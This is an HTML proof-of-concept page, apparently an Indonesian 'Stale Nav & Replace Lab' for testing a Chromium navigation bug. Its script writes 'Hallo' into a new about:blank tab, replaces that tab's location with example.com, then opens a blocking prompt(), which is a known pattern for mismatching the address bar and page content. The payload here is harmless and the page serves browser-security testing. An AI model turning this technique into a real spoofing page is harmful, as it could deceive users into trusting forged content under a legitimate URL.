<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Chromium Stale Navigation & Replace Lab</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #0b0f19;
            color: #f1f5f9;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding: 50px 20px;
            margin: 0;
        }
        .wrapper {
            background: #1e293b;
            padding: 35px;
            border-radius: 14px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            max-width: 420px;
            margin: 0 auto;
            border: 1px solid #334155;
        }
        h2 {
            font-size: 1.3rem;
            color: #38bdf8;
            margin-bottom: 10px;
        }
        p {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-bottom: 25px;
        }
        .btn-trigger {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn-trigger:active {
            background-color: #1d4ed8;
        }
        .logger {
            margin-top: 20px;
            background: #020617;
            border: 1px solid #1e293b;
            border-radius: 6px;
            padding: 12px;
            font-family: monospace;
            font-size: 0.75rem;
            color: #4ade80;
            text-align: left;
            height: 120px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <h2>Stale Nav & Replace Lab</h2>
        <p>Simulasi injeksi DOM "Hallo" dengan replace ke example.com.</p>
        <button id="launchBtn" class="btn-trigger">JALANKAN STRESS TEST</button>
        <div id="logBox" class="logger">[System] Menunggu interaksi pengguna...</div>
    </div>

    <script>
        const logBox = document.getElementById('logBox');

        function addLog(message) {
            const timeStr = new Date().toLocaleTimeString();
            logBox.innerHTML += `[${timeStr}] ${message}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        document.getElementById('launchBtn').addEventListener('click', function() {
            addLog("Membuka jendela baru (about:blank)...");

            // 1. Membuka jendela baru dengan konteks kosong
            let newTab = window.open('about:blank', '_blank');

            if (!newTab) {
                addLog("ERROR: Pop-up diblokir oleh peramban.");
                return;
            }

            try {
                // 2. Menyuntikkan konten awal "Hallo" ke dalam dokumen kosong
                newTab.document.open();
                newTab.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head><title>Stale Test View</title></head>
                    <body style="background:#ffffff; color:#0f172a; text-align:center; padding-top:80px; font-family:sans-serif;">
                        <h1 style="font-size: 3rem; color: #1e293b;">Hallo</h1>
                        <p style="color: #64748b;">Konteks render awal sebelum penggantian.</p>
                    </body>
                    </html>
                `);
                newTab.document.close();
                addLog("Konten 'Hallo' berhasil disuntikkan ke about:blank.");

                // 3. Menggunakan location.replace() untuk memaksa pergantian navigasi ke example.com
                setTimeout(() => {
                    addLog("Memicu location.replace() ke example.com...");
                    newTab.location.replace("https://example.com");
                }, 50);

                // 4. Memicu dialog modal sinkronus untuk menguji penguncian utas utama (main thread lock)
                setTimeout(() => {
                    addLog("Mengeksekusi dialog modal (prompt) untuk mengunci thread...");
                    try {
                        newTab.prompt("STALE NAVIGATION / THREAD LOCK", "Verify State");
                    } catch (e) {
                        addLog("Modal dibatasi oleh kebijakan keamanan sandbox.");
                    }
                }, 250);

            } catch (err) {
                addLog("EXCEPTION: " + err.message);
            }
        });
    </script>

</body>
</html>
